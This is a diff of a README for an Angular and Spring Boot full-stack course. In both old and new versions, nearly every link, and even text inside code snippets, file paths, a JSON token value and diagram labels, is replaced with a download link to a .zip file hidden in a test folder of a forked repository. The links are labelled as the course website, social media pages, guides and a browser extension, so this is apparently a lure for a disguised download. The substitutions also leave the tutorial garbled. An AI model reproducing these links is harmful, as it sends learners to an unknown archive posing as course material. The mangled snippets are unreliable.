 
 ### Other Courses
-- 300+ Videos and Courses - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-- [25 Videos and Articles for Beginners on Spring Boot](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+- 300+ Videos and Courses - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+- [25 Videos and Articles for Beginners on Spring Boot](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
 
 ## About in28Minutes
 - At in28Minutes, we ask ourselves one question everyday. How do we help you learn effectively - that is more quickly and retain more of what you have learnt?
@@ -867,7 +867,7 @@ npm install --save-dev @angular/cli@latest
 npm install
 ```
 - Why Visual Studio Code?
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip%2Fm%2F0k2kj45,%2Fm%2F0_x5x3g,%2Fm%2F0134xwrk,%2Fm%2F0b6h18n
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip%2Fm%2F0k2kj45,%2Fm%2F0_x5x3g,%2Fm%2F0134xwrk,%2Fm%2F0b6h18n
 - We use Light Theme
 - Install
     - Auto Import - Automatically finds, parses and provides code actions and code completion for all available imports. Works with Typescript and TSX
@@ -912,14 +912,14 @@ How are they different from JavaScript Modules?
 
 ### Running Angular Applications
 - What is 'ng serve'? What does it enable for developers?
-- What is Root Module? What are Bootstrap Components? How is the Angular Application Bootstrapped?  ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```AppModule```, ```AppComponent```
-- Do Browsers understand TypeScript? How does TypeScript code get converted to JavaScript code? ```\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```
-- What are ```https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\node_modules? 
+- What is Root Module? What are Bootstrap Components? How is the Angular Application Bootstrapped?  ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```AppModule```, ```AppComponent```
+- Do Browsers understand TypeScript? How does TypeScript code get converted to JavaScript code? ```\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```
+- What are ```https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\node_modules? 
 
 ## Automated Tests and Code Quality
 - What are unit tests? How are unit tests organized in Angular? How is different from Java?
-- How can you run tests? ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```
-- What are coding standards? How can you check coding standards for Angular Cli Project? What is Lint? What is Linting? Is there a Standard Style Guide for Angular? ```\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```
+- How can you run tests? ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```
+- What are coding standards? How can you check coding standards for Angular Cli Project? What is Lint? What is Linting? Is there a Standard Style Guide for Angular? ```\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```
 - How can I run coding standards check for Angular Projects?
 - What are end to end tests? How are end to end tests organized in Angular? How can you run end to end tests? e2e folder
 
@@ -1030,7 +1030,7 @@ Response
 
 ```
 {
-"token": "https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip"
+"token": "https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip"
 }
 ```
 
@@ -1040,10 +1040,10 @@ Other URLS
 
   
 ### Useful Links
-- [Our Website](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
-- [Facebook](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
-- [Twitter](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
-- [Google Plus](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+- [Our Website](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
+- [Facebook](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
+- [Twitter](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
+- [Google Plus](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
 
 ## Connection to MySQL
 
@@ -1061,12 +1061,12 @@ create table todo (
 ```
 ---
 
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 ```json
 {
     // Use IntelliSense to learn about possible attributes.
     // Hover to view descriptions of existing attributes.
-    // For more information, visit: https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+    // For more information, visit: https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
     "version": "0.2.0",
     "configurations": [
         {
@@ -1080,11 +1080,11 @@ https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-s
 }
 ```
 
-- https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ```
 npm install @angular/material @angular/cdk
-<link href="https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip+Icons" rel="stylesheet">
+<link href="https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip+Icons" rel="stylesheet">
 npm install @angular/flex-layout rxjs-compat
 ```
 
@@ -1159,13 +1159,13 @@ node[shape=record]
 COMPONENT[label=<Component>];
 
 TEMPLATE[label=<Template<BR />
-   <FONT POINT-SIZE="9">HTML https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip</FONT>>];
+   <FONT POINT-SIZE="9">HTML https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip</FONT>>];
 
 STYLE[label=<Style<BR />
-   <FONT POINT-SIZE="9">CSS https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip</FONT>>];
+   <FONT POINT-SIZE="9">CSS https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip</FONT>>];
 
 CODE[label=<Code<BR />
-   <FONT POINT-SIZE="9">TypeScript  https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip</FONT>>];
+   <FONT POINT-SIZE="9">TypeScript  https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip</FONT>>];
 
 COMPONENT -- TEMPLATE
 COMPONENT -- STYLE
@@ -1197,7 +1197,7 @@ node[style=filled,color="#59C8DE"]
 rankdir = LR;
 node[shape=record]
 COMPONENT[label=<Business Logic <BR />(Component)<BR />
-   <FONT POINT-SIZE="10">TypeScript https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip</FONT>>];
+   <FONT POINT-SIZE="10">TypeScript https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip</FONT>>];
 
 VIEW[label=<DOM <BR />(HTML/View)>];
 
@@ -1206,7 +1206,7 @@ VIEW[label=<DOM <BR />(HTML/View)>];
 //COMPONENT -> VIEW [label=<<FONT POINT-SIZE="25">Interpolation </FONT> {{value}} >]
 //COMPONENT -> VIEW [label=<<FONT POINT-SIZE="25">Property Binding  </FONT> [property]=value >]
 VIEW -> COMPONENT [label = ""]
-COMPONENT -> VIEW  [label=<<FONT POINT-SIZE="25">2 Way Data Binding  </FONT> [(ngModel)]="https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip" >]
+COMPONENT -> VIEW  [label=<<FONT POINT-SIZE="25">2 Way Data Binding  </FONT> [(ngModel)]="https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip" >]
 }   
 
 graph architecture {
@@ -1272,76 +1272,76 @@ AutomationTests -- Protractor
 - Common Error Handling and Server Side Validation and Other REST API Features?
 - Common Message Component for RESTful Calls
 - Moving @CrossOrigin to a Common Location
-- What is Bundling? What are https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip How are they generated? ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```, ```\src\**\*https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip```
+- What is Bundling? What are https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip How are they generated? ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```, ```\src\**\*https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip```
 - How can I rollback changes made by Angular CLI?
 - How can you learn to write tests for Angular? 
 - How can you learn to write end to end tests for Angular?
 - What are Dependency Injection Options other than root?
 - Spring Security Authorization
 - What are the different kinds of Data Binding?
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
   - Angular Specific Syntax
-    - [https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip]="isActive()"
-    - [https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip]="determineFont"
+    - [https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip]="isActive()"
+    - [https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip]="determineFont"
 - How do you build various form elements in Angular? 
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - What is a Child Component?
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - How can you configure environment configuration in Angular Projects? src\environments folder
 - How do you create a production deployment? What are the production optimizations that are? What is Uglification? What is Minification?
-- https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - Dev vs Prod Configuration
 - Deployment
   - Seperate vs Together
   - Deploying to Cloud
 - Material Design
 - Debugging with Visual Studio Code
-  - To debug the client side Angular code, we'll need to install the Debugger for Chrome extension - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - To debug the client side Angular code, we'll need to install the Debugger for Chrome extension - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
   - Open the Extensions view (⇧⌘X or Ctrl+Shift+X)
   - Type Debugger for Chrome
   - Install
   - Reload
   - Go to the Debug view (⇧⌘D or Ctrl+Shift+D)
-  - Click on gear button to create https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - Click on gear button to create https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
   - Choose Chrome from the Select Environment dropdown
   - Set URL to "url": "http://localhost:4200"
 - Running Examples
   - Download the zip or clone the Git repository.
   - Unzip the zip file (if you downloaded one)
-  - Open Command Prompt and Change directory (cd) to folder containing https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - Open Command Prompt and Change directory (cd) to folder containing https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
   - Open Eclipse 
      - File -> Import -> Existing Maven Project -> Navigate to the folder where you unzipped the zip
      - Select the right project
   - Choose the Spring Boot Application file (search for file with @SpringBootApplication)
   - Right Click on the file and Run as Java Application
   - You are all Set
-  - For help : use our installation guide - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - For help : use our installation guide - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ## Next Steps
 - Angular
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - TypeScript 
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip 
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip 
 - Modern JavaScript 
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - More References
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 
 ### Troubleshooting
-- Refer our TroubleShooting Guide - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- Refer our TroubleShooting Guide - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ## Youtube Playlists - 500+ Videos
 
-[Click here - 30+ Playlists with 500+ Videos on Spring, Spring Boot, REST, Microservices and the Cloud](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+[Click here - 30+ Playlists with 500+ Videos on Spring, Spring Boot, REST, Microservices and the Cloud](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
 
 ## Keep Learning in28Minutes
 
